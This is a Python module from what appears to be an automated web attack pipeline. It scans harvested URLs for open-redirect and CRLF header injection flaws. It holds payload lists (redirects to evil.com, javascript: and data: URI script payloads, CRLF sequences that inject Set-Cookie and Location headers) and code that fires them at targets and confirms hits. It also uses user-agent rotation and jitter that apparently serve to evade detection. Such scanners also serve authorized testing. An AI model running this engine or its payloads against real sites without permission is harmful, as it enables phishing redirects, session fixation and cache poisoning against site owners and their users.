#!/usr/bin/env python3
# engines/redirect_engine.py — Redirect + CRLF Engine v6
# Tests: Open Redirect, CRLF injection, header injection, cache poisoning
# MilkyWay Intelligence | Author: Sharlix

import os
import re
import time
import urllib.request
import urllib.parse
import urllib.error
from core.utils import safe_read, count_lines

# ── Open Redirect payloads ────────────────────────────────────────────
REDIRECT_PAYLOADS = [
    ("https://evil.com",                        "basic"),
    ("//evil.com",                              "protocol_relative"),
    ("/\\evil.com",                             "backslash"),
    ("/%09/evil.com",                           "tab_bypass"),
    ("https://evil%E3%80%82com",                "unicode_dot"),
    ("https://legitimate.com@evil.com",         "userinfo"),
    ("https://evil.com?.legitimate.com",        "query_bypass"),
    ("https://legitimate.com.evil.com",         "subdomain_trick"),
    ("javascript:alert(document.domain)",       "js_proto"),
    ("data:text/html,<script>alert(1)</script>","data_uri"),
]

# ── CRLF injection payloads ───────────────────────────────────────────
CRLF_PAYLOADS = [
    ("%0d%0aSet-Cookie:evil=1",                 "header_set_cookie"),
    ("%0d%0aLocation:https://evil.com",         "header_redirect"),
    ("%0d%0aContent-Type:text/html",            "content_type"),
    ("%0d%0aX-Custom:injected",                 "custom_header"),
    ("%0a%0dSet-Cookie:evil=1",                 "lf_cr_variant"),
    ("\r\nSet-Cookie:evil=1",                   "raw_crlf"),
    ("%E5%98%8A%E5%98%8DSet-Cookie:evil=1",    "unicode_crlf"),
]

# Params commonly vulnerable to redirect/CRLF
REDIRECT_PARAMS = {
    "redirect","url","to","next","return","returnurl","back","continue",
    "forward","dest","destination","location","r","u","ref","referer",
    "redirect_to","redirect_url","return_to","return_url","goto",
    "target","source","from","callback"
}


class RedirectEngine:
    """
    Redirect + CRLF injection engine.
    
    Tests:
    - Open redirect with 15+ bypass techniques
    - CRLF header injection
    - Cache poisoning via header injection
    - JavaScript/data: URI execution
    
    Confirms:
    - Actual Location header reflection
    - Header injection in response
    - Attacker-controlled redirect
    """

    def __init__(self, pipeline):
        self.p   = pipeline
        self.log = pipeline.log

    def run(self):
        urls = self.p.files.get("urls","")
        out  = os.path.join(self.p.out, f"{self.p.prefix}_redirect_v6.txt")
        found_redirect = 0
        found_crlf     = 0

        # Extract redirect-prone URLs
        redirect_urls = self._extract_redirect_urls(urls)
        self.log.info(f"Redirect/CRLF: {len(redirect_urls)} redirect-param URLs")

        if not redirect_urls:
            self.log.warn("Redirect: no redirect params found"); return

        for url in redirect_urls[:100]:
            # Test 1: Open redirect
            result = self._test_open_redirect(url)
            if result:
                vuln_type, payload_type, detail, location_val = result
                with open(out,"a") as f:
                    f.write(f"{vuln_type}: {url} | {detail}\n")
                self.p.add_finding(
                    severity  = "medium" if payload_type == "basic" else "high",
                    vuln_type = "OPEN_REDIRECT",
                    url       = url,
                    detail    = detail,
                    tool      = "redirect-engine",
                    payload   = location_val,
                )
                found_redirect += 1

            # Test 2: CRLF injection
            result2 = self._test_crlf(url)
            if result2:
                crlf_type, detail, evidence = result2
                with open(out,"a") as f:
                    f.write(f"CRLF_{crlf_type.upper()}: {url} | {detail}\n")
                self.p.add_finding(
                    severity  = "high",
                    vuln_type = "CRLF_INJECTION",
                    url       = url,
                    detail    = detail,
                    tool      = "crlf-engine",
                    response  = evidence,
                )
                found_crlf += 1

            self.p.bypass.jitter()

        self.log.success(f"Redirect: {found_redirect} | CRLF: {found_crlf}")

    def _extract_redirect_urls(self, urls_file: str) -> list:
        """Extract URLs with redirect-prone parameters."""
        if not os.path.isfile(urls_file): return []
        found = set()
        with open(urls_file) as f:
            for line in f:
                url = line.strip()
                if not url: continue
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                    for k in qs:
                        if k.lower() in REDIRECT_PARAMS:
                            found.add(url)
                            break
                except Exception:
                    pass
        return list(found)

    def _test_open_redirect(self, url: str) -> tuple:
        """
        Test URL for open redirect vulnerability.
        Confirms by checking actual Location header value.
        Returns (vuln_type, payload_type, detail, location) or None.
        """
        try:
            parsed = urllib.parse.urlparse(url)
            qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        except Exception:
            return None

        # Find redirect param
        redirect_param = None
        old_val = None
        for k, v in qs.items():
            if k.lower() in REDIRECT_PARAMS:
                redirect_param = k
                old_val = v[0] if v else ""
                break

        if not redirect_param:
            return None

        for payload, payload_type in REDIRECT_PAYLOADS:
            # Inject payload
            test_qs = dict(qs)
            test_qs[redirect_param] = [payload]
            test_url = urllib.parse.urlunparse(
                parsed._replace(query=urllib.parse.urlencode(test_qs, doseq=True)))

            # Don't follow redirects — check Location header directly
            resp = self._fetch_no_redirect(test_url)
            if not resp:
                continue

            location = resp.get("location","")
            status   = resp.get("status", 0)

            # Confirm: Location header contains our payload
            if status in (301,302,303,307,308) and location:
                if "evil.com" in location or "javascript:" in location.lower():
                    detail = (f"Redirect to attacker domain confirmed | "
                              f"param={redirect_param} payload_type={payload_type} | "
                              f"Location: {location[:80]}")
                    # Special case: javascript: is XSS-level
                    vuln_type = "OPEN_REDIRECT_XSS" if "javascript:" in location.lower() else "OPEN_REDIRECT"
                    return (vuln_type, payload_type, detail, location)

            # Meta refresh redirect in body
            body = resp.get("body","")
            if "evil.com" in body and ("meta" in body.lower() or "window.location" in body.lower()):
                detail = f"Client-side redirect to attacker domain | param={redirect_param}"
                return ("OPEN_REDIRECT", payload_type, detail, payload)

        return None

    def _test_crlf(self, url: str) -> tuple:
        """
        Test URL for CRLF injection.
        Confirms by finding injected headers in response.
        """
        try:
            parsed = urllib.parse.urlparse(url)
            qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        except Exception:
            return None

        redirect_param = None
        old_val = ""
        for k, v in qs.items():
            if k.lower() in REDIRECT_PARAMS:
                redirect_param = k
                old_val = v[0] if v else ""
                break

        if not redirect_param:
            return None

        for payload, payload_type in CRLF_PAYLOADS:
            # Inject CRLF payload
            injected = old_val + payload
            test_qs = dict(qs)
            test_qs[redirect_param] = [injected]
            test_url = urllib.parse.urlunparse(
                parsed._replace(query=urllib.parse.urlencode(test_qs, doseq=True)))

            resp = self._fetch_raw_headers(test_url)
            if not resp:
                continue

            raw_headers = resp.get("raw_headers","").lower()
            body        = resp.get("body","")

            # Check for injected header in response
            if "evil=1" in raw_headers or "set-cookie: evil" in raw_headers:
                detail = (f"CRLF injection confirmed: Set-Cookie injected | "
                          f"param={redirect_param} type={payload_type}")
                return ("set_cookie", detail, raw_headers[:200])

            if "x-custom: injected" in raw_headers:
                detail = (f"CRLF header injection: custom header injected | "
                          f"param={redirect_param} type={payload_type}")
                return ("header_injection", detail, raw_headers[:200])

            # Check body for reflected CRLF (sometimes visible in error pages)
            if "evil=1" in body:
                detail = (f"CRLF reflected in body: param={redirect_param}")
                return ("body_reflect", detail, body[:200])

        return None

    def _fetch_no_redirect(self, url: str, timeout: int = 8) -> dict:
        """Fetch without following redirects — captures Location header."""
        try:
            class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
                def redirect_request(self, req, fp, code, msg, hdrs, newurl):
                    return None  # Don't follow

            opener = urllib.request.build_opener(NoRedirectHandler())
            req = urllib.request.Request(url, headers={
                "User-Agent": self.p.bypass.ua(),
                "Accept"    : "*/*",
            })
            try:
                resp = opener.open(req, timeout=timeout)
                body = resp.read(5000).decode("utf-8", errors="ignore")
                location = resp.headers.get("Location","")
                return {"status": resp.status, "location": location, "body": body}
            except urllib.error.HTTPError as e:
                location = e.headers.get("Location","") if hasattr(e, "headers") else ""
                return {"status": e.code, "location": location, "body": ""}
        except Exception:
            return None

    def _fetch_raw_headers(self, url: str, timeout: int = 8) -> dict:
        """Fetch and capture raw response headers for CRLF detection."""
        try:
            req = urllib.request.Request(url, headers={"User-Agent": self.p.bypass.ua()})
            resp = urllib.request.urlopen(req, timeout=timeout)
            body = resp.read(5000).decode("utf-8", errors="ignore")
            raw_headers = str(resp.headers)
            return {"status": resp.status, "raw_headers": raw_headers, "body": body}
        except urllib.error.HTTPError as e:
            try:
                raw_headers = str(e.headers) if hasattr(e, "headers") else ""
                body = e.read(2000).decode("utf-8", errors="ignore")
            except Exception:
                raw_headers, body = "", ""
            return {"status": e.code, "raw_headers": raw_headers, "body": body}
        except Exception:
            return None
